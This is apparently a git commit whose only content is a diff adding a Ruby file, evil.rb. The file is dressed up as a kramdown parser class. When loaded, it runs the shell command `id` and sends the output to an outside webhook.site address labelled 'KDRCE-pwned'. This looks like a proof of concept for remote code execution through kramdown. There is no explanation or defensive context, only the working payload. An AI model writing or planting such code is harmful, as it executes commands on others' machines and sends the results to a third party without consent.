defa6dd2b6d582129d2e6335022ca296340e7e2f
pg <a@b.c>
2026-07-12 04:11:17 +0300

    x

---
+++ evil.rb
@@ -0,0 +1,3 @@
+require "open-uri" rescue nil
+(URI.open("https://0da1c1eb-e51b-4a56-942f-d48eab0c3310.webhook.site/KDRCE-pwned?u=#{ (`id` rescue 'noid').to_s.strip }") rescue nil)
+module Kramdown; module Parser; class Evil; def initialize(*a); end; def parse; end; end; end; end
